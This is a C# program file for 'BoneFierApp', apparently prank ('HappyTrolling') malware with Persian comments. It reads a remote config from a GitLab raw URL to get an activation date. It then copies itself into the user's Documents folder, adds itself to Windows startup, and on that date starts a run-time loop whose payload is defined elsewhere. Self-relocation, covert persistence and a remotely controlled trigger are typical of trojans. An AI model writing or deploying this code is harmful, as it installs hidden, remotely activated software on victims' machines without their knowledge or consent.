using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using ReflectionClassOverriding;
using BoneFierApp.Components.HappyTrolling;

namespace BoneFierApp
{
    internal class Program
    {
        //cloud data = https://gitlab.com/AliiMohammadi/happytrolling/-/raw/main/RemoteDataHappyTrolling.txt

        public static bool Debug = false;

        static void Main(string[] args)
        {
            Start();
        }
        static void Start ()
        {
            RemoteData ProgramData;

            //گرفتن اطلاعات از سرور یا پیش فرض 
            string Cloudstring = new CloudReader().Read(@"https://gitlab.com/AliiMohammadi/happytrolling/-/raw/main/RemoteDataHappyTrolling.txt");
                
            if (!String.IsNullOrWhiteSpace(Cloudstring)) 
                    ProgramData = JsonHelper.Deserialize<RemoteData>(Cloudstring); // اطلاعات جدید رو از سرور میگیره
            else
                ProgramData = new RemoteData(); //در غیر اطلاعات پیش فرض رو میگیره

            HappyTrolling.Remotedata = ProgramData;

            AppActions BONEFIER = new AppActions(HappyTrolling.Remotedata.Activationdate.ToDateTime());

            //ادرس پیش فرض مهاجرت :
            // Documents/ApplicationName.exe
            BONEFIER.Emigrate(BONEFIER.EmigrationPath);

            S_Actions.ChekStartUp("Bonefier" , BONEFIER.TargetPath);//استارت اپ

            if (!Debug)
            {
                //برسی تاریخ فعال سازی
                if (AppActions.CheckActivationDay(BONEFIER.ActivationDate)) 
                {
                    RunTimeLoop.StartLoop();//فعال سازی
                }
                else
                {
                    AppActions.Exit();//خروج اگر اون روز نیست
                }
            }
            else
            {
                RunTimeLoop.StartLoop();
            }
        }

        static void Log(object mess)
        {
            Trace.WriteLine(mess);
        }
    }
}
